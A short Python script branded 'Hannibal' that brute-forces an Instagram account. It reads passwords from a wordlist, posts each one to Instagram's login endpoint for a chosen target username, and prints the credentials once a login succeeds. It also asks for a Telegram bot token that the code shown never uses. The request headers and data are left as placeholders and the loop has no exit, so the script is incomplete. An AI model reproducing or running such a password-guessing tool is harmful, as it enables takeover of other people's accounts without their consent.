import requests
import random
from user_agent import generate_user_agent
import pyfiglet

# = = = = = = = = = = = = = = = = = = = = = = = = 



Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
Z = '\033[2;31m'  # Red, second shade
F = '\033[2;32m'  # Green
A = '\033[2;34m'  # Blue
C = '\033[2;35m'  # Pink
B = '\033[2;36m'  # Cyan
Y = '\033[1;34m'  # Light blue



# = = = = = = = = = = = = = = = = = = = = = = = = 


logo = pyfiglet.figlet_format('Hannibal')
print(A+ logo)

# Get user input
id = input('Enter Your Telegram ID: ')  # Fixed missing colon
token = input('Enter Your Telegram Bot Token: ')  # Fixed variable name


# = = = = = = = = = = = = = = = = = = = = = = = = 



# Create session and open password file
r = requests.session()
file = input('Enter Name of Password File: ')
with open(file, 'r') as rfile:  # Use with to ensure file is closed

    # Iterate through password file
    us = input(Y+'Enter Target Username: ')
    while True:
        username = us
        password = rfile.readline().split('\n')[0]  # Read password correctly



# = = = = = = = = = = = = = = = = = = = = = = = = 





        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {
            # ... (headers here)
        }
        data = {
            # ... (data here)
        }

        # Send login request
        req_login = r.post(url, headers=headers, data=data, proxies=None)

        if 'userId' in req_login.text:
            print(F + 'Username: ' + username)
            print(F + 'Password: ' + password)



        else:
            print(Z + 'Error: ' + password)
            print(X + '- - - - - - - - - -')
            
            # = = = = = = = = = = = = = = = = = = = = = = = = 
